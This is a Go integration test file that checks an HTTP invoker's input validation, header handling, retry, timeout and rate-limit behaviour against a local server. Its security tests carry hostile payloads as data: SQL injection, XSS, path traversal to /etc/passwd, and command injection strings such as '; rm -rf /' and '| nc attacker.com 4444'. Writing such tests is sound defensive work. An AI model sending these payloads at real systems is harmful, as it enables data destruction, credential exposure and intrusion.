// Copyright 2025 Croupier Authors
// Licensed under the Apache License, Version 2.0

//go:build integration
// +build integration

package croupier

import (
	"context"
	"fmt"
	"strings"
	"testing"
	"time"
)

// TestSecurityValidation_InputValidation tests input validation security
func TestSecurityValidation_InputValidation(t *testing.T) {
	t.Run("SQL injection payloads", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Simulate SQL injection attempts
		maliciousPayloads := []string{
			`{"query":"SELECT * FROM users WHERE id='1' OR '1'='1'"}`,
			`{"input":"admin'--"}`,
			`{"search":"'; DROP TABLE users; --"}`,
			`{"data":"1' UNION SELECT * FROM passwords"}`,
			`{"id":"1'; EXEC xp_cmdshell('dir'); --"}`,
		}

		for i, payload := range maliciousPayloads {
			result, err := invoker.Invoke(ctx, "test.function", payload, InvokeOptions{})
			t.Logf("SQL injection attempt %d: error=%v, result_len=%d", i, err, len(result))
		}
	})

	t.Run("XSS payloads", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		xssPayloads := []string{
			`{"input":"<script>alert('XSS')</script>"}`,
			`{"data":"<img src=x onerror=alert('XSS')>"}`,
			`{"html":"<iframe src=javascript:alert('XSS')></iframe>"}`,
			`{"text":"<svg onload=alert('XSS')>"}`,
			`{"payload":"javascript:alert('XSS')"}`,
		}

		for i, payload := range xssPayloads {
			result, err := invoker.Invoke(ctx, "test.function", payload, InvokeOptions{})
			t.Logf("XSS attempt %d: error=%v, result_len=%d", i, err, len(result))
		}
	})

	t.Run("Path traversal payloads", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		traversalPayloads := []string{
			`{"file":"../../etc/passwd"}`,
			`{"path":"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"}`,
			`{"file":"....//....//etc/passwd"}`,
			`{"path":"%2e%2e%2fpasswd"}`,
			`{"file":"../../../../../../../../etc/passwd"}`,
		}

		for i, payload := range traversalPayloads {
			result, err := invoker.Invoke(ctx, "test.function", payload, InvokeOptions{})
			t.Logf("Path traversal %d: error=%v, result_len=%d", i, err, len(result))
		}
	})

	t.Run("Command injection payloads", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		commandPayloads := []string{
			`{"file":"; cat /etc/passwd"}`,
			"{\"data\":\"`ls -la`\"}",
			`{"input":"$(whoami)"}`,
			`{"cmd":"; rm -rf /"}`,
			`{"file":"| nc attacker.com 4444"}`,
		}

		for i, payload := range commandPayloads {
			result, err := invoker.Invoke(ctx, "test.function", payload, InvokeOptions{})
			t.Logf("Command injection %d: error=%v, result_len=%d", i, err, len(result))
		}
	})
}

// TestSecurityValidation_HeaderSecurity tests HTTP header security
func TestSecurityValidation_HeaderSecurity(t *testing.T) {
	t.Run("Header injection", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Test headers with CRLF injection attempts
		maliciousHeaders := []map[string]string{
			{"X-Custom": "value\r\nX-Injected: malicious"},
			{"User-Agent": "value\r\nX-Injected: header"},
			{"X-Forwarded-For": "127.0.0.1\r\nX-Injected: true"},
		}

		for i, headers := range maliciousHeaders {
			opts := InvokeOptions{Headers: headers}
			result, err := invoker.Invoke(ctx, "test.function", "{}", opts)
			t.Logf("Header injection attempt %d: error=%v, result_len=%d", i, err, len(result))
		}
	})

	t.Run("Overly long headers", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Create extremely long header values
		longValue := strings.Repeat("X", 10000)
		headers := map[string]string{
			"X-Long-Header": longValue,
		}

		opts := InvokeOptions{Headers: headers}
		result, err := invoker.Invoke(ctx, "test.function", "{}", opts)
		t.Logf("Overly long header: error=%v, result_len=%d", err, len(result))
	})

	t.Run("Special characters in headers", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		specialHeaders := map[string]string{
			"X-Control-Chars": "\x00\x01\x02\x03",
			"X-Unicode": "测试中文🎉",
			"X-Quotes":       `"value"`,
			"X-Null":         "value\x00",
		}

		opts := InvokeOptions{Headers: specialHeaders}
		result, err := invoker.Invoke(ctx, "test.function", "{}", opts)
		t.Logf("Special characters in headers: error=%v, result_len=%d", err, len(result))
	})
}

// TestErrorRecovery_ResiliencePatterns tests error recovery patterns
func TestErrorRecovery_ResiliencePatterns(t *testing.T) {
	t.Run("Retry after transient failures", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
			Retry: &RetryConfig{
				Enabled:        true,
				MaxAttempts:    5,
				InitialDelayMs: 100,
				MaxDelayMs:     2000,
			},
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Simulate recovery after errors
		for i := 0; i < 3; i++ {
			result, err := invoker.Invoke(ctx, "test.function", "{}", InvokeOptions{})
			t.Logf("Recovery attempt %d: error=%v, result_len=%d", i, err, len(result))
			time.Sleep(time.Millisecond * 100)
		}
	})

	t.Run("Fallback mechanism", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Try primary, then fallback
		primaryResult, primaryErr := invoker.Invoke(ctx, "service.primary", "{}", InvokeOptions{})
		t.Logf("Primary service: error=%v, result_len=%d", primaryErr, len(primaryResult))

		fallbackResult, fallbackErr := invoker.Invoke(ctx, "service.fallback", "{}", InvokeOptions{})
		t.Logf("Fallback service: error=%v, result_len=%d", fallbackErr, len(fallbackResult))
	})

	t.Run("Circuit breaker recovery", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
			Retry: &RetryConfig{
				Enabled:     false, // Let circuit breaker handle retries
				MaxAttempts: 1,
			},
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Simulate circuit breaker states
		states := []string{"closed", "open", "half-open", "closed"}

		for _, state := range states {
			payload := fmt.Sprintf(`{"circuit":"test","state":"%s"}`, state)
			result, err := invoker.Invoke(ctx, "circuitbreaker.state", payload, InvokeOptions{})
			t.Logf("Circuit breaker state %s: error=%v, result_len=%d", state, err, len(result))

			time.Sleep(time.Millisecond * 50)
		}
	})

	t.Run("Graceful degradation", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Test degraded service responses
		functions := []string{
			"service.full",
			"service.degraded",
			"service.minimal",
		}

		for _, fn := range functions {
			result, err := invoker.Invoke(ctx, fn, "{}", InvokeOptions{})
			t.Logf("Service level %s: error=%v, result_len=%d", fn, err, len(result))
		}
	})
}

// TestErrorRecovery_TimeoutRecovery tests timeout recovery
func TestErrorRecovery_TimeoutRecovery(t *testing.T) {
	t.Run("Recovery after timeout", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		// First call with short timeout (will timeout)
		ctx1, cancel1 := context.WithTimeout(context.Background(), time.Nanosecond)
		defer cancel1()

		result1, err1 := invoker.Invoke(ctx1, "test.function", "{}", InvokeOptions{})
		t.Logf("Short timeout: error=%v, result_len=%d", err1, len(result1))

		// Second call with longer timeout
		ctx2, cancel2 := context.WithTimeout(context.Background(), time.Second)
		defer cancel2()

		result2, err2 := invoker.Invoke(ctx2, "test.function", "{}", InvokeOptions{})
		t.Logf("Longer timeout: error=%v, result_len=%d", err2, len(result2))
	})

	t.Run("Adaptive timeout", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		// Start with short timeout, progressively increase
		timeouts := []time.Duration{
			time.Millisecond * 10,
			time.Millisecond * 50,
			time.Millisecond * 100,
			time.Millisecond * 500,
		}

		for i, timeout := range timeouts {
			ctx, cancel := context.WithTimeout(context.Background(), timeout)
			defer cancel()

			result, err := invoker.Invoke(ctx, "test.function", "{}", InvokeOptions{})
			t.Logf("Adaptive timeout %d: error=%v, result_len=%d", i, err, len(result))
		}
	})
}

// TestErrorRecovery_StateRecovery tests state recovery after errors
func TestErrorRecovery_StateRecovery(t *testing.T) {
	t.Run("Recovery after invalid function ID", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Call with invalid ID
		_, err1 := invoker.Invoke(ctx, "", "{}", InvokeOptions{})
		t.Logf("Invalid function ID: error=%v", err1)

		// Call with valid ID
		result, err2 := invoker.Invoke(ctx, "test.function", "{}", InvokeOptions{})
		t.Logf("Valid function ID: error=%v, result_len=%d", err2, len(result))
	})

	t.Run("Recovery after malformed payload", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Malformed payload
		_, err1 := invoker.Invoke(ctx, "test.function", "{invalid json", InvokeOptions{})
		t.Logf("Malformed payload: error=%v", err1)

		// Valid payload
		result, err2 := invoker.Invoke(ctx, "test.function", "{}", InvokeOptions{})
		t.Logf("Valid payload: error=%v, result_len=%d", err2, len(result))
	})

	t.Run("Recovery after schema set error", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		// Try to set invalid schema
		schema := map[string]interface{}{
			"type":     "invalid",
			"properties": map[string]interface{}{},
		}
		_ = invoker.SetSchema("test.function", schema)

		// Set valid schema
		validSchema := map[string]interface{}{
			"type": "string",
		}
		err := invoker.SetSchema("test.function", validSchema)
		t.Logf("Schema after error: error=%v", err)
	})
}

// TestErrorRecovery_ConnectionRecovery tests connection recovery
func TestErrorRecovery_ConnectionRecovery(t *testing.T) {
	t.Run("Reconnection attempts", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
			Reconnect: &ReconnectConfig{
				Enabled:           true,
				MaxAttempts:       3,
				InitialDelayMs:    100,
				MaxDelayMs:        1000,
				BackoffMultiplier: 2.0,
			},
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Multiple invoke attempts (testing reconnection)
		for i := 0; i < 5; i++ {
			result, err := invoker.Invoke(ctx, "test.function", "{}", InvokeOptions{})
			t.Logf("Reconnection attempt %d: error=%v, result_len=%d", i, err, len(result))
			time.Sleep(time.Millisecond * 50)
		}
	})

	t.Run("Connection pool recovery", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		// Create and close multiple times
		for i := 0; i < 3; i++ {
			invoker := NewHTTPInvoker(config)
			if invoker != nil {
				ctx := context.Background()
				result, err := invoker.Invoke(ctx, "test.function", "{}", InvokeOptions{})
				t.Logf("Iteration %d: error=%v, result_len=%d", i, err, len(result))

				invoker.Close()
				time.Sleep(time.Millisecond * 10)
			}
		}
	})
}

// TestSecurityValidation_ResourceLimiting tests resource limiting
func TestSecurityValidation_ResourceLimiting(t *testing.T) {
	t.Run("Rate limiting simulation", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Simulate rapid requests that might hit rate limits
		const rapidRequests = 50
		for i := 0; i < rapidRequests; i++ {
			result, err := invoker.Invoke(ctx, "test.function", "{}", InvokeOptions{})
			if i%10 == 0 {
				t.Logf("Request %d: error=%v, result_len=%d", i, err, len(result))
			}
			_ = result
		}
		t.Logf("Completed %d rapid requests", rapidRequests)
	})

	t.Run("Payload size limits", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Test with various payload sizes
		sizes := []int{
			1024,       // 1 KB
			10240,      // 10 KB
			102400,     // 100 KB
			1024000,    // 1 MB
		}

		for _, size := range sizes {
			payload := fmt.Sprintf(`{"data":"%s"}}`, string(make([]byte, size)))
			result, err := invoker.Invoke(ctx, "test.function", payload, InvokeOptions{})
			t.Logf("Payload size %d bytes: error=%v, result_len=%d", size, err, len(result))
		}
	})
}

// TestSecurityValidation_AuthorizationTests tests authorization scenarios
func TestSecurityValidation_AuthorizationTests(t *testing.T) {
	t.Run("Authentication headers", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		authScenarios := []struct {
			name    string
			headers map[string]string
		}{
			{
				"with valid token",
				map[string]string{
					"Authorization": "Bearer valid-token-12345",
					"X-API-Key":       "api-key-67890",
				},
			},
			{
				"with expired token",
				map[string]string{
					"Authorization": "Bearer expired-token",
				},
			},
			{
				"with no auth",
				map[string]string{},
			},
			{
				"with malformed auth",
				map[string]string{
					"Authorization": "Bearer",
					"X-API-Key":       "",
				},
			},
		}

		for _, scenario := range authScenarios {
			opts := InvokeOptions{Headers: scenario.headers}
			result, err := invoker.Invoke(ctx, "test.function", "{}", opts)
			t.Logf("Auth scenario '%s': error=%v, result_len=%d", scenario.name, err, len(result))
		}
	})
}

// TestErrorRecovery_CascadeFailure tests cascade failure scenarios
func TestErrorRecovery_CascadeFailure(t *testing.T) {
	t.Run("Dependency chain failure", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Simulate dependency chain: A -> B -> C
		services := []string{"service.a", "service.b", "service.c"}

		for _, service := range services {
			result, err := invoker.Invoke(ctx, service, `{"dependency":"true"}`, InvokeOptions{})
			t.Logf("Service %s: error=%v, result_len=%d", service, err, len(result))
		}
	})

	t.Run("Partial failure recovery", func(t *testing.T) {
		config := &InvokerConfig{
			Address: "http://localhost:19090",
		}

		invoker := NewHTTPInvoker(config)
		if invoker == nil {
			t.Fatal("NewHTTPInvoker returned nil")
		}
		defer invoker.Close()

		ctx := context.Background()

		// Some operations succeed, some fail
		operations := []struct {
			name string
			fn   string
		}{
			{"op1", "test.success"},
			{"op2", "test.failure"},
			{"op3", "test.success"},
			{"op4", "test.failure"},
		}

		successCount := 0
		for _, op := range operations {
			result, err := invoker.Invoke(ctx, op.fn, "{}", InvokeOptions{})
			if err == nil {
				successCount++
			}
			t.Logf("Operation %s: error=%v, result_len=%d", op.name, err, len(result))
		}

		t.Logf("Partial failure: %d/%d successful", successCount, len(operations))
	})
}

// TestSecurityValidation_EncryptionTests tests encryption scenarios
func TestSecurityValidation_EncryptionTests(t *testing.T) {
	t.Run("TLS configuration validation", func(t *testing.T) {
		configs := []*InvokerConfig{
			{
				Address:  "localhost:19090",
				Insecure: true,
			},
			{
				Address:  "localhost:19090",
				Insecure: false,
			},
		}

		for i, config := range configs {
			invoker := NewHTTPInvoker(config)
			if invoker != nil {
				ctx := context.Background()
				result, err := invoker.Invoke(ctx, "test.function", "{}", InvokeOptions{})
				t.Logf("Config %d (Insecure=%v): error=%v, result_len=%d",
					i, config.Insecure, err, len(result))
				invoker.Close()
			}
		}
	})
}
